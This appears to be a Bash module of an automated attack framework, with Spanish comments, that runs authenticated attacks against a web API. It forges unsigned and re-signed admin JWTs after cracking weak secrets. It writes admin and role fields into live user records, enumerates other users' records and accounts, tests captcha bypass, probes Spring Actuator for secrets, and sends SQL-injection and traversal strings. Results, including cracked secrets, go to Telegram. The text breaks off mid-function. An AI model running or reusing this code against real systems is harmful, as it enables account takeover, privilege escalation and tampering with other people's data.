#!/usr/bin/env bash
# ============================================================
#  modules/29_api_auth_scan.sh
#  Fase 29: Authenticated API Security Scanner
#
#  Estrategia:
#    1. Leer configuración de API extraída del bundle JS (tabla js_api_configs)
#    2. Intentar login con credenciales del vault → obtener JWT/session
#    3. Con token válido, ejecutar batería de tests:
#       a. IDOR horizontal: ID enumeration en endpoints REST
#       b. Mass assignment: inyectar campos privilegiados en PUT/PATCH
#       c. JWT attacks: alg:none, weak HS256 secrets, kid injection
#       d. User enumeration en password reset / registro
#       e. Captcha bypass: parámetro presente vs ausente
#       f. Spring Actuator disclosure: /actuator/env, /mappings, /beans
#       g. Stack trace detection en parámetros malformados
#       h. Unauth endpoints: API paths sin token → 200 vs 401
#
#  Requisitos:
#    - Vault con credenciales (db: auth_credentials)
#    - JS bundle ya analizado (module 11 + js_api_extractor)
#    - python3 (jwt, requests opcionalmente)
# ============================================================

MODULE_NAME="api_auth_scan"
MODULE_DESC="Authenticated API Security Scanner"

# ── JWT toolkit ───────────────────────────────────────────────
# Genera un JWT con alg:none (sin firma)
_jwt_alg_none() {
  local PAYLOAD="$1"    # JSON string
  local HDR
  HDR=$(python3 -c "import base64,json; h=json.dumps({'alg':'none','typ':'JWT'}); print(base64.urlsafe_b64encode(h.encode()).rstrip(b'=').decode())" 2>/dev/null)
  local PLD
  PLD=$(python3 -c "import base64,sys; p=sys.argv[1]; print(base64.urlsafe_b64encode(p.encode()).rstrip(b'=').decode())" "$PAYLOAD" 2>/dev/null)
  echo "${HDR}.${PLD}."
}

# Crack HS256/HS512 con wordlist básica de secretos débiles de Spring/Java
_jwt_crack_weak_secret() {
  local TOKEN="$1"
  local WORDLIST=(
    "secret" "secret123" "password" "changeme" "spring"
    "spring-boot" "springboot" "jwt-secret" "jwtsecret"
    "mysecret" "mysecretkey" "mySecretKey" "secretKey"
    "application" "AppSecret" "app-secret" "defaultSecret"
    "jwtSecret" "jwt_secret" "token_secret" "TOKEN_SECRET"
    "HS512_SECRET" "HS256_SECRET" "signing_key" "signingkey"
    "your-256-bit-secret" "your-512-bit-secret"
    "supersecret" "ultra-secret" "verysecret" "tokem"
    "2BB80D537B1DA3E38BD30361AA855686BDE0EACD7162FEF6A25FE97BF527A25B"
  )

  python3 - "$TOKEN" << 'PYEOF'
import sys, base64, hashlib, hmac, json

def b64d(s):
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

token = sys.argv[1]
parts = token.split(".")
if len(parts) != 3:
    sys.exit(1)

header_raw = b64d(parts[0])
try:
    header = json.loads(header_raw)
    alg = header.get("alg", "HS256")
except Exception:
    sys.exit(1)

if alg not in ("HS256", "HS384", "HS512"):
    sys.exit(1)

hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
h_func = hash_map[alg]

signing_input = (parts[0] + "." + parts[1]).encode()
try:
    expected_sig = b64d(parts[2])
except Exception:
    sys.exit(1)

secrets = [
    "secret","secret123","password","changeme","spring",
    "spring-boot","springboot","jwt-secret","jwtsecret",
    "mysecret","mysecretkey","mySecretKey","secretKey",
    "application","AppSecret","app-secret","defaultSecret",
    "jwtSecret","jwt_secret","token_secret","TOKEN_SECRET",
    "HS512_SECRET","HS256_SECRET","signing_key","signingkey",
    "your-256-bit-secret","your-512-bit-secret",
    "supersecret","ultra-secret","verysecret","token",
    "2BB80D537B1DA3E38BD30361AA855686BDE0EACD7162FEF6A25FE97BF527A25B",
]

for s in secrets:
    mac = hmac.HMAC(s.encode(), signing_input, h_func).digest()
    if mac == expected_sig:
        print(s)
        sys.exit(0)
sys.exit(1)
PYEOF
}

# Decodifica payload JWT (sin verificar firma)
_jwt_decode_payload() {
  local TOKEN="$1"
  python3 -c "
import sys, base64, json
parts = sys.argv[1].split('.')
if len(parts) < 2: sys.exit(1)
p = parts[1] + '=' * (4 - len(parts[1]) % 4)
try:
    print(base64.urlsafe_b64decode(p).decode())
except Exception:
    sys.exit(1)
" "$TOKEN" 2>/dev/null
}

# ── Login helper ──────────────────────────────────────────────
# Intenta login y devuelve el JWT o cookie de sesión
# Retorna: TOKEN|HEADER_NAME|AUTH_PREFIX
_api_login() {
  local LOGIN_URL="$1"      # URL completa del endpoint de login
  local USERNAME="$2"
  local PASSWORD="$3"
  local LOGIN_BODY_TPL="$4" # JSON template con __USERNAME__ y __PASSWORD__
  local FORCE_PARAMS="$5"   # JSON extra fields (forceLogin:true...)
  local AUTH_HEADER="${6:-Authorization}"
  local AUTH_PREFIX="${7:-Bearer}"

  # Construir body de login
  local BODY
  BODY=$(python3 - "$LOGIN_BODY_TPL" "$USERNAME" "$PASSWORD" "$FORCE_PARAMS" << 'PYEOF'
import sys, json, re

tpl_raw, user, pwd, force_raw = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]

# Default body if no template
if not tpl_raw or tpl_raw == "null":
    body = {}
else:
    try:
        body = json.loads(tpl_raw)
    except Exception:
        body = {}

# Replace placeholders
for k, v in list(body.items()):
    if v == "__USERNAME__":
        body[k] = user
    elif v == "__PASSWORD__":
        body[k] = pwd

# If template had no user/pass fields, add common ones
has_user = any(re.search(r"user|login|email|identificador|nif", k, re.I)
               for k in body) if body else False
has_pass = any(re.search(r"pass|pwd|secret|contrasenya", k, re.I)
               for k in body) if body else False

if not has_user:
    body["username"] = user
if not has_pass:
    body["password"] = pwd

# Merge force params
try:
    force = json.loads(force_raw) if force_raw and force_raw != "{}" else {}
    body.update(force)
except Exception:
    pass

print(json.dumps(body))
PYEOF
  )

  [[ -z "$BODY" ]] && BODY="{\"username\":\"${USERNAME}\",\"password\":\"${PASSWORD}\"}"

  # First attempt: with forceLogin if available
  local RESP STATUS
  RESP=$(curl -s --max-time 15 \
    -H "Content-Type: application/json" \
    -H "Accept: application/json" \
    -A "${SCAN_UA:-Mozilla/5.0}" \
    -c /tmp/.api_scan_cookies_$$ \
    -w "\n###HTTP###%{http_code}" \
    -d "$BODY" \
    "$LOGIN_URL" 2>/dev/null)
  STATUS=$(echo "$RESP" | grep -oP '(?<=###HTTP###)\d+' | tail -1)
  local RESP_BODY
  RESP_BODY=$(echo "$RESP" | sed '/###HTTP###/d')

  # Extract token from response body (common patterns)
  local TOKEN
  TOKEN=$(echo "$RESP_BODY" | python3 -c "
import sys, json, re
try:
    d = json.loads(sys.stdin.read())
    # Common token keys
    for k in ['token','access_token','accessToken','jwt','id_token','idToken',
              'auth_token','authToken','sessionToken','data']:
        if k in d:
            v = d[k]
            if isinstance(v, dict):
                for kk in ['token','access_token','accessToken','jwt']:
                    if kk in v:
                        print(v[kk]); sys.exit(0)
            elif isinstance(v, str) and len(v) > 20:
                print(v); sys.exit(0)
    # Fallback: find any eyJ... JWT in values
    raw = json.dumps(d)
    m = re.search(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', raw)
    if m: print(m.group(0))
except Exception:
    # Try plain text / header-based
    raw = sys.stdin.read()
    m = re.search(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', raw)
    if m: print(m.group(0))
" 2>/dev/null)

  if [[ -n "$TOKEN" && "$STATUS" =~ ^2 ]]; then
    echo "${TOKEN}|${AUTH_HEADER}|${AUTH_PREFIX}"
    rm -f /tmp/.api_scan_cookies_$$
    return 0
  fi

  rm -f /tmp/.api_scan_cookies_$$
  return 1
}

# ── Test: IDOR horizontal (ID enumeration) ───────────────────
_test_api_idor() {
  local BASE_URL="$1" TOKEN="$2" AUTH_HDR="$3" AUTH_PFX="$4"
  local DOMAIN_ID="$5" DOMAIN="$6"

  log_info "  [api_auth] IDOR test: $BASE_URL"

  # Endpoints con ID en ruta (REST pattern)
  local IDOR_PATTERNS
  IDOR_PATTERNS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE_URL%/}%'
       AND (url GLOB '*/[0-9]*' OR url GLOB '*/[0-9][0-9]*'
            OR url LIKE '%/me%' OR url LIKE '%/profile%')
     LIMIT 20;" 2>/dev/null)

  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue

    # Extract numeric ID from path
    local NUM_ID
    NUM_ID=$(echo "$URL" | grep -oP '/(\d{1,10})(?:/|$)' | grep -oP '\d+' | head -1)
    [[ -z "$NUM_ID" ]] && continue

    local BASE_PATH="${URL%/$NUM_ID*}/"
    local TEST_IDS=( $((NUM_ID - 1)) $((NUM_ID + 1)) 1 2 )

    # Get baseline response with our own ID
    local ORIG_STATUS ORIG_LEN
    ORIG_STATUS=$(curl -s --max-time 10 \
      -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
      -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)
    ORIG_LEN=$(curl -s --max-time 10 \
      -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
      -o /dev/null -w "%{size_download}" "$URL" 2>/dev/null)

    [[ "$ORIG_STATUS" != "200" ]] && continue

    for TID in "${TEST_IDS[@]}"; do
      [[ "$TID" == "$NUM_ID" || "$TID" -le 0 ]] && continue
      local TEST_URL="${BASE_PATH}${TID}"
      local TEST_STATUS TEST_LEN
      TEST_STATUS=$(curl -s --max-time 10 \
        -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
        -o /dev/null -w "%{http_code}" "$TEST_URL" 2>/dev/null)
      TEST_LEN=$(curl -s --max-time 10 \
        -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
        -o /dev/null -w "%{size_download}" "$TEST_URL" 2>/dev/null)

      if [[ "$TEST_STATUS" == "200" && "$TEST_LEN" -gt 50 && "$TEST_LEN" != "$ORIG_LEN" ]]; then
        log_warn "  ⚡ IDOR: $TEST_URL (ID $NUM_ID→$TID, ${TEST_LEN}B)"
        db_add_finding "$DOMAIN_ID" "api_idor" "high" "$TEST_URL" \
          "idor_id_swap" "ID $NUM_ID→$TID returned ${TEST_LEN}B (orig ${ORIG_LEN}B)"
        _telegram_send "🎯 *IDOR Autenticado*
🌐 \`${DOMAIN}\`
🔗 \`${TEST_URL}\`
📝 ID ${NUM_ID} → ${TID} devuelve datos (${TEST_LEN}B)
⚠️ Posible acceso a datos de otro usuario
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
        break
      fi
    done
  done <<< "$IDOR_PATTERNS"
}

# ── Test: Mass assignment ─────────────────────────────────────
_test_mass_assignment() {
  local BASE_URL="$1" TOKEN="$2" AUTH_HDR="$3" AUTH_PFX="$4"
  local DOMAIN_ID="$5" DOMAIN="$6"

  log_info "  [api_auth] Mass assignment: $BASE_URL"

  # Find PUT/PATCH endpoints from DB
  local PUT_ENDPOINTS
  PUT_ENDPOINTS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE_URL%/}%'
       AND (url LIKE '%/user%' OR url LIKE '%/profile%'
            OR url LIKE '%/account%' OR url LIKE '%/me%'
            OR url LIKE '%/student%' OR url LIKE '%/estudiant%')
     LIMIT 10;" 2>/dev/null)

  # Privileged fields to inject
  local PRIV_FIELDS='{"role":"admin","roles":["ROLE_ADMIN","ROLE_BACKEND"],"isAdmin":true,"admin":true,"authorities":["ROLE_ADMIN"],"is_superuser":true,"isVerified":true,"verified":true,"active":true,"status":"admin","userType":"admin","privileged":true}'

  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue

    # First GET to get the current object
    local CURRENT_BODY CURRENT_STATUS
    CURRENT_BODY=$(curl -s --max-time 10 \
      -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
      -H "Accept: application/json" \
      "$URL" 2>/dev/null)
    CURRENT_STATUS=$(curl -s --max-time 10 \
      -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
      -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)

    [[ "$CURRENT_STATUS" != "200" ]] && continue

    # Merge privileged fields into current object
    local MERGED_BODY
    MERGED_BODY=$(python3 -c "
import sys, json
try:
    curr = json.loads(sys.argv[1])
    priv = json.loads(sys.argv[2])
    curr.update(priv)
    print(json.dumps(curr))
except Exception:
    print(sys.argv[2])
" "$CURRENT_BODY" "$PRIV_FIELDS" 2>/dev/null)

    [[ -z "$MERGED_BODY" ]] && MERGED_BODY="$PRIV_FIELDS"

    local PUT_RESP PUT_STATUS
    PUT_STATUS=$(curl -s --max-time 15 \
      -X PUT \
      -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
      -H "Content-Type: application/json" \
      -d "$MERGED_BODY" \
      -o /tmp/.mass_assign_resp_$$ \
      -w "%{http_code}" "$URL" 2>/dev/null)
    PUT_RESP=$(cat /tmp/.mass_assign_resp_$$ 2>/dev/null)
    rm -f /tmp/.mass_assign_resp_$$

    if [[ "$PUT_STATUS" =~ ^2 ]]; then
      # Check if any privileged field appeared in response
      local ESCALATED=false
      if echo "$PUT_RESP" | python3 -c "
import sys, json, re
try:
    d = json.loads(sys.stdin.read())
    privileged = ['admin','ROLE_ADMIN','ROLE_BACKEND','superuser','is_superuser']
    raw = json.dumps(d)
    for p in privileged:
        if p in raw: sys.exit(0)
    sys.exit(1)
except Exception:
    sys.exit(1)
" 2>/dev/null; then
        ESCALATED=true
      fi

      if $ESCALATED; then
        log_warn "  ⚡ Mass Assignment: $URL → campos privilegiados aceptados"
        db_add_finding "$DOMAIN_ID" "api_mass_assignment" "critical" "$URL" \
          "mass_assignment" "PUT aceptó campos privilegiados: role/admin/authorities"
        _telegram_send "🔑 *Mass Assignment — Escalada de privilegios*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📝 PUT con campos role/admin aceptados en respuesta
⚠️ Verificar acceso admin tras la petición
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
      else
        log_info "  [api_auth] PUT $URL → $PUT_STATUS (campos ignorados)"
      fi
    fi
  done <<< "$PUT_ENDPOINTS"
}

# ── Test: JWT attacks ─────────────────────────────────────────
_test_jwt_attacks() {
  local ENDPOINT="$1" TOKEN="$2" AUTH_HDR="$3" AUTH_PFX="$4"
  local DOMAIN_ID="$5" DOMAIN="$6"

  log_info "  [api_auth] JWT attacks: $ENDPOINT"

  # Decode current payload
  local PAYLOAD_JSON
  PAYLOAD_JSON=$(_jwt_decode_payload "$TOKEN")
  [[ -z "$PAYLOAD_JSON" ]] && return 1

  # ── Attack 1: alg:none ──────────────────────────────────────
  local ALG_NONE_TOKEN
  ALG_NONE_TOKEN=$(_jwt_alg_none "$PAYLOAD_JSON")

  local NONE_STATUS
  NONE_STATUS=$(curl -s --max-time 10 \
    -H "${AUTH_HDR}: ${AUTH_PFX} ${ALG_NONE_TOKEN}" \
    -o /dev/null -w "%{http_code}" "$ENDPOINT" 2>/dev/null)

  if [[ "$NONE_STATUS" == "200" ]]; then
    log_warn "  ⚡ JWT alg:none ACEPTADO: $ENDPOINT → HTTP $NONE_STATUS"
    db_add_finding "$DOMAIN_ID" "jwt_alg_none" "critical" "$ENDPOINT" \
      "jwt_alg_none" "alg:none JWT aceptado — servidor no valida firma"
    _telegram_send "🔓 *JWT alg:none aceptado*
🌐 \`${DOMAIN}\`
🔗 \`${ENDPOINT}\`
⚠️ El servidor acepta tokens sin firma — escalada de privilegios trivial
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi

  # ── Attack 2: weak secret crack ─────────────────────────────
  local CRACKED_SECRET
  CRACKED_SECRET=$(_jwt_crack_weak_secret "$TOKEN")

  if [[ -n "$CRACKED_SECRET" ]]; then
    log_warn "  ⚡ JWT secreto débil: '$CRACKED_SECRET'"
    db_add_finding "$DOMAIN_ID" "jwt_weak_secret" "critical" "$ENDPOINT" \
      "jwt_weak_secret" "JWT signing secret: '$CRACKED_SECRET'"
    _telegram_send "🔑 *JWT secreto débil crackeado*
🌐 \`${DOMAIN}\`
🔗 \`${ENDPOINT}\`
🗝️ Secreto: \`${CRACKED_SECRET}\`
⚠️ Forjar tokens de admin con: python3 -c \"import jwt; print(jwt.encode({'sub':'admin','roles':['ROLE_ADMIN']}, '${CRACKED_SECRET}', algorithm='HS256'))\"
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi

  # ── Attack 3: privilege escalation in payload ───────────────
  # Try forging a token with admin roles (only if secret is known)
  if [[ -n "$CRACKED_SECRET" ]]; then
    local ADMIN_PAYLOAD
    ADMIN_PAYLOAD=$(echo "$PAYLOAD_JSON" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    # Escalate roles
    for k in ['authorities','roles','role','scope']:
        if k in d:
            d[k] = ['ROLE_ADMIN','ROLE_BACKEND']
    d['isAdmin'] = True
    print(json.dumps(d))
except Exception:
    sys.exit(1)
" 2>/dev/null)
    if [[ -n "$ADMIN_PAYLOAD" ]]; then
      local ADMIN_TOKEN
      ADMIN_TOKEN=$(python3 -c "
import sys, json, base64, hmac, hashlib
payload_s, secret = sys.argv[1], sys.argv[2]
def b64enc(s):
    return base64.urlsafe_b64encode(s).rstrip(b'=').decode()
hdr = b64enc(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
pld = b64enc(payload_s.encode())
sig_input = (hdr + '.' + pld).encode()
sig = hmac.HMAC(secret.encode(), sig_input, hashlib.sha256).digest()
print(hdr + '.' + pld + '.' + b64enc(sig))
" "$ADMIN_PAYLOAD" "$CRACKED_SECRET" 2>/dev/null)

      if [[ -n "$ADMIN_TOKEN" ]]; then
        local ADMIN_STATUS
        ADMIN_STATUS=$(curl -s --max-time 10 \
          -H "${AUTH_HDR}: ${AUTH_PFX} ${ADMIN_TOKEN}" \
          -o /dev/null -w "%{http_code}" "$ENDPOINT" 2>/dev/null)
        log_info "  [api_auth] Forged admin JWT → HTTP $ADMIN_STATUS at $ENDPOINT"
        if [[ "$ADMIN_STATUS" == "200" ]]; then
          db_add_finding "$DOMAIN_ID" "jwt_privilege_escalation" "critical" "$ENDPOINT" \
            "jwt_forge_admin" "Admin JWT forjado aceptado — acceso con ROLE_ADMIN confirmado"
        fi
      fi
    fi
  fi
}

# ── Test: User enumeration ────────────────────────────────────
_test_user_enum() {
  local RESET_URL="$1" DOMAIN_ID="$2" DOMAIN="$3"

  log_info "  [api_auth] User enum: $RESET_URL"

  # Fake/nonexistent identifier
  local FAKE_IDS=( "00000000X" "99999999Z" "NONEXISTENT123" "test@notarealdom.xyz" )
  # Plausible format based on the URL pattern

  local BASELINE_STATUS BASELINE_BODY
  BASELINE_STATUS=$(curl -s --max-time 10 \
    -H "Content-Type: application/json" \
    -o /tmp/.enum_resp_$$ \
    -w "%{http_code}" \
    -d "{\"identificador\":\"${FAKE_IDS[0]}\"}" \
    "$RESET_URL" 2>/dev/null)
  BASELINE_BODY=$(cat /tmp/.enum_resp_$$ 2>/dev/null)
  rm -f /tmp/.enum_resp_$$

  # Try with a likely real format (numeric NIF)
  local REAL_STATUS REAL_BODY
  REAL_STATUS=$(curl -s --max-time 10 \
    -H "Content-Type: application/json" \
    -o /tmp/.enum_resp_$$ \
    -w "%{http_code}" \
    -d "{\"identificador\":\"12345678A\"}" \
    "$RESET_URL" 2>/dev/null)
  REAL_BODY=$(cat /tmp/.enum_resp_$$ 2>/dev/null)
  rm -f /tmp/.enum_resp_$$

  # Also try GET variant (some apps use query params)
  local GET_FAKE_STATUS GET_REAL_STATUS
  GET_FAKE_STATUS=$(curl -s --max-time 10 \
    -o /dev/null -w "%{http_code}" \
    "${RESET_URL}?identificador=${FAKE_IDS[0]}" 2>/dev/null)
  GET_REAL_STATUS=$(curl -s --max-time 10 \
    -o /dev/null -w "%{http_code}" \
    "${RESET_URL}?identificador=12345678A" 2>/dev/null)

  # Detect difference: status code or response body shape
  local ENUM_FOUND=false
  if [[ "$BASELINE_STATUS" != "$REAL_STATUS" ]]; then
    ENUM_FOUND=true
    log_warn "  ⚡ User enum (status diff): $RESET_URL → fake=$BASELINE_STATUS real=$REAL_STATUS"
  elif [[ "$BASELINE_BODY" != "$REAL_BODY" ]]; then
    # Compare response structure
    local DIFF_SCORE
    DIFF_SCORE=$(python3 -c "
import sys, json
try:
    a = json.loads(sys.argv[1])
    b = json.loads(sys.argv[2])
    # Different keys = different response shape = user enum
    if set(a.keys()) != set(b.keys()): print('1')
    elif a.get('code') != b.get('code'): print('1')
    elif a.get('error') != b.get('error'): print('1')
    else: print('0')
except Exception:
    if sys.argv[1][:50] != sys.argv[2][:50]: print('1')
    else: print('0')
" "$BASELINE_BODY" "$REAL_BODY" 2>/dev/null || echo "0")
    [[ "$DIFF_SCORE" == "1" ]] && ENUM_FOUND=true && \
      log_warn "  ⚡ User enum (body diff): $RESET_URL"
  elif [[ "$GET_FAKE_STATUS" != "$GET_REAL_STATUS" ]]; then
    ENUM_FOUND=true
    log_warn "  ⚡ User enum (GET status diff): ${RESET_URL} → fake=$GET_FAKE_STATUS real=$GET_REAL_STATUS"
  fi

  if $ENUM_FOUND; then
    db_add_finding "$DOMAIN_ID" "user_enumeration" "medium" "$RESET_URL" \
      "user_enum_reset" "Respuesta diferente para usuario existente vs no existente en password reset"
    _telegram_send "👤 *User Enumeration*
🌐 \`${DOMAIN}\`
🔗 \`${RESET_URL}\`
📊 Fake: HTTP $BASELINE_STATUS | Real: HTTP $REAL_STATUS
⚠️ Permite enumerar usuarios válidos vía reset password
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi
}

# ── Test: Captcha bypass ──────────────────────────────────────
_test_captcha_bypass() {
  local ENDPOINT="$1" DOMAIN_ID="$2" DOMAIN="$3"
  local BASE_BODY="${4:-{}}"

  log_info "  [api_auth] Captcha bypass: $ENDPOINT"

  local NO_CAPTCHA_STATUS FAKE_CAPTCHA_STATUS

  # Without captcha param
  NO_CAPTCHA_STATUS=$(curl -s --max-time 10 \
    -H "Content-Type: application/json" \
    -o /dev/null -w "%{http_code}" \
    -d "$BASE_BODY" "$ENDPOINT" 2>/dev/null)

  # With fake captcha
  local BODY_WITH_CAPTCHA
  BODY_WITH_CAPTCHA=$(python3 -c "
import sys, json
try:
    d = json.loads(sys.argv[1])
    d['captcha'] = 'bypass_test_fake_captcha_value'
    d['g-recaptcha-response'] = 'bypass_test'
    d['recaptcha'] = 'bypass_test'
    print(json.dumps(d))
except Exception:
    print('{\"captcha\":\"bypass_test\"}')
" "$BASE_BODY" 2>/dev/null)

  FAKE_CAPTCHA_STATUS=$(curl -s --max-time 10 \
    -H "Content-Type: application/json" \
    -o /tmp/.captcha_resp_$$ \
    -w "%{http_code}" \
    -d "$BODY_WITH_CAPTCHA" "$ENDPOINT" 2>/dev/null)
  local FAKE_BODY
  FAKE_BODY=$(cat /tmp/.captcha_resp_$$ 2>/dev/null)
  rm -f /tmp/.captcha_resp_$$

  # Bypass confirmed: captcha present but arbitrary value accepted (2xx or different from no-captcha)
  # Also detect: 500 when captcha absent but 200 when captcha present with fake value
  local BYPASS_FOUND=false

  if [[ "$NO_CAPTCHA_STATUS" =~ ^(400|422|500) ]] && \
     [[ "$FAKE_CAPTCHA_STATUS" =~ ^(200|201|202|204) ]]; then
    BYPASS_FOUND=true
    log_warn "  ⚡ Captcha bypass: $ENDPOINT → sin captcha=$NO_CAPTCHA_STATUS, fake=$FAKE_CAPTCHA_STATUS"
  elif [[ "$FAKE_CAPTCHA_STATUS" =~ ^(200|201) ]]; then
    # Check if response doesn't mention captcha validation error
    if ! echo "$FAKE_BODY" | grep -qi "captcha\|robot\|verification\|invalid"; then
      BYPASS_FOUND=true
      log_warn "  ⚡ Captcha bypass (sin validación): $ENDPOINT → HTTP $FAKE_CAPTCHA_STATUS"
    fi
  fi

  if $BYPASS_FOUND; then
    db_add_finding "$DOMAIN_ID" "captcha_bypass" "medium" "$ENDPOINT" \
      "captcha_bypass" "Captcha param presente con valor falso aceptado — sin validación real (HTTP $FAKE_CAPTCHA_STATUS)"
    _telegram_send "🤖 *Captcha Bypass*
🌐 \`${DOMAIN}\`
🔗 \`${ENDPOINT}\`
📊 Sin captcha: $NO_CAPTCHA_STATUS | Fake captcha: $FAKE_CAPTCHA_STATUS
⚠️ Automatización ilimitada posible (brute force, spam, scraping)
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi
}

# ── Test: Spring Actuator disclosure ─────────────────────────
_test_actuator() {
  local BASE_URL="$1" TOKEN="$2" AUTH_HDR="$3" AUTH_PFX="$4"
  local DOMAIN_ID="$5" DOMAIN="$6"

  log_info "  [api_auth] Spring Actuator: $BASE_URL"

  local ACTUATOR_PATHS=(
    "/actuator"
    "/actuator/env"
    "/actuator/health"
    "/actuator/info"
    "/actuator/mappings"
    "/actuator/beans"
    "/actuator/configprops"
    "/actuator/loggers"
    "/actuator/metrics"
    "/actuator/threaddump"
    "/actuator/heapdump"
    "/actuator/httptrace"
    "/manage/actuator/env"
    "/management/actuator/env"
    "/api/actuator/env"
  )

  local HOST
  HOST=$(echo "$BASE_URL" | grep -oP 'https?://[^/]+')

  for APATH in "${ACTUATOR_PATHS[@]}"; do
    local TEST_URL="${HOST}${APATH}"
    local STATUS BODY

    # Try without auth first (unauth exposure)
    BODY=$(curl -s --max-time 10 \
      -H "Accept: application/json" \
      -w "\n###STATUS###%{http_code}" \
      "$TEST_URL" 2>/dev/null)
    STATUS=$(echo "$BODY" | grep -oP '(?<=###STATUS###)\d+')
    BODY=$(echo "$BODY" | sed '/###STATUS###/d')

    if [[ "$STATUS" == "200" ]] && echo "$BODY" | grep -qi "activeProfiles\|propertySources\|spring\|datasource\|password"; then
      log_warn "  ⚡ Actuator expuesto (sin auth): $TEST_URL"
      db_add_finding "$DOMAIN_ID" "spring_actuator" "high" "$TEST_URL" \
        "actuator_unauth" "Spring Actuator expuesto sin autenticación — ${APATH}"
      _telegram_send "🌿 *Spring Actuator expuesto (sin auth)*
🌐 \`${DOMAIN}\`
🔗 \`${TEST_URL}\`
⚠️ Posible exposición de secrets/config en /actuator/env
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
      continue
    fi

    # Try with authenticated token
    if [[ -n "$TOKEN" ]]; then
      BODY=$(curl -s --max-time 10 \
        -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
        -H "Accept: application/json" \
        -w "\n###STATUS###%{http_code}" \
        "$TEST_URL" 2>/dev/null)
      STATUS=$(echo "$BODY" | grep -oP '(?<=###STATUS###)\d+')
      BODY=$(echo "$BODY" | sed '/###STATUS###/d')

      if [[ "$STATUS" == "200" ]] && echo "$BODY" | grep -qi "activeProfiles\|propertySources\|spring\|datasource"; then
        log_warn "  ⚡ Actuator accesible con token user: $TEST_URL"
        # Check for sensitive data
        local SEVERITY="medium"
        echo "$BODY" | grep -qi "password\|secret\|key\|token\|credential" && SEVERITY="critical"
        db_add_finding "$DOMAIN_ID" "spring_actuator" "$SEVERITY" "$TEST_URL" \
          "actuator_auth" "Actuator accesible con credenciales de usuario — escalada de privilegios"
        if [[ "$SEVERITY" == "critical" ]]; then
          _telegram_send "🚨 *Actuator con secrets expuesto (con auth user)*
🌐 \`${DOMAIN}\`
🔗 \`${TEST_URL}\`
⚠️ Actuator accesible con JWT de usuario — contiene passwords/keys
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
        fi
      fi
    fi
  done
}

# ── Test: Stack trace detection ───────────────────────────────
_test_stack_trace() {
  local BASE_URL="$1" TOKEN="$2" AUTH_HDR="$3" AUTH_PFX="$4"
  local DOMAIN_ID="$5" DOMAIN="$6"

  log_info "  [api_auth] Stack trace detection: $BASE_URL"

  # Endpoints that might throw exceptions with bad input
  local ENDPOINTS
  ENDPOINTS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE_URL%/}%'
       AND url LIKE '%?%'
     LIMIT 10;" 2>/dev/null)

  # Malformed values that trigger exceptions
  local EVIL_VALUES=( "'" "\"" "1'" "1 OR 1=1" "null" "undefined" "NaN" "[]" "{}" "../../../../" )

  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue

    # Extract first parameter
    local PARAM
    PARAM=$(echo "$URL" | grep -oP '(?<=\?)[^&=]+' | head -1)
    [[ -z "$PARAM" ]] && continue

    for EVIL in "${EVIL_VALUES[@]}"; do
      local TEST_URL BODY STATUS
      local _EVIL_ENC
      _EVIL_ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$EVIL" 2>/dev/null || printf '%s' "$EVIL")
      TEST_URL=$(echo "$URL" | sed -E "s|([?&]${PARAM}=)[^&]*|\1${_EVIL_ENC}|")
      BODY=$(curl -s --max-time 10 \
        -H "${AUTH_HDR}: ${AUTH_PFX} ${TOKEN}" \
        -w "\n###STATUS###%{http_code}" \
        "$TEST_URL" 2>/dev/null)
      STATUS=$(echo "$BODY" | grep -oP '(?<=###STATUS###)\d+')
      BODY=$(echo "$BODY" | sed '/###STATUS###/d')

      if echo "$BODY" | grep -qiE "at org\.|at com\.|at java\.|at sun\.|at javax\.|StackTrace|NullPointerException|IllegalArgument|ClassCast|NumberFormat|ParseException"; then
        log_warn "  ⚡ Stack trace expuesto: $TEST_URL → HTTP $STATUS"
        local TRACE_SNIPPET
        TRACE_SNIPPET=$(echo "$BODY" | grep -oP "at \S+\.\S+\(\S+\)" | head -3 | tr '\n' ' ')
        db_add_finding "$DOMAIN_ID" "stack_trace_disclosure" "medium" "$TEST_URL" \
          "stack_trace" "Stack trace con param '$PARAM'='$EVIL': ${TRACE_SNIPPET}"
        _telegram_send "📚 *Stack Trace expuesto*
🌐 \`${DOMAIN}\`
